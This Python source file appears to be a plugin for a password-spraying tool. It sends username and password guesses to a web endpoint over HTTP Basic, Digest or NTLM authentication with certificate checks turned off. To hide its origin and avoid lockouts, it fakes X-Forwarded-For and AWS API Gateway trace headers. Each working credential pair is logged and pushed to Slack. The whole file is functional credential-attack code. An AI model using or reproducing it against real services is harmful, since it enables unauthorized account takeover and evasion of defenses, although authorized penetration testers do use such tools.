import datetime, requests, requests_ntlm
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def httpbrute_authenticate(url, username, password, useragent, pluginargs): 
    
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip' : None,
        'throttled' : False,
        'error' : False,
        'output' : ""
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    # CHANGEME: Add more if necessary
    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:

        resp = None

        full_url = "{}/{}".format(url,pluginargs['uri'])

        if pluginargs['auth'] == 'basic':
            auth = requests.auth.HTTPBasicAuth(username, password)
            resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)

        elif pluginargs['auth'] == 'digest':
            auth = requests.auth.HTTPDigestAuth(username, password)
            resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)

        else: # NTLM
            auth = requests_ntlm.HttpNtlmAuth(username, password)
            resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)


        if resp.status_code == 200:
            data_response['success'] = True
            data_response['output'] = utils.prGreen('[!] SUCCESS: => {}:{}'.format(username, password))
            utils.slacknotify(username, password)

        elif resp.status_code == 401:
            data_response['success'] = False
            data_response['output'] = utils.prRed('FAILURE: => {}:{}'.format(username, password))

        else: #fail
            data_response['success'] = False
            data_response['output'] = utils.prYellow('UNKNOWN_RESPONSE_CODE: {} => {}:{}'.format(resp.status_code, username, password))


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
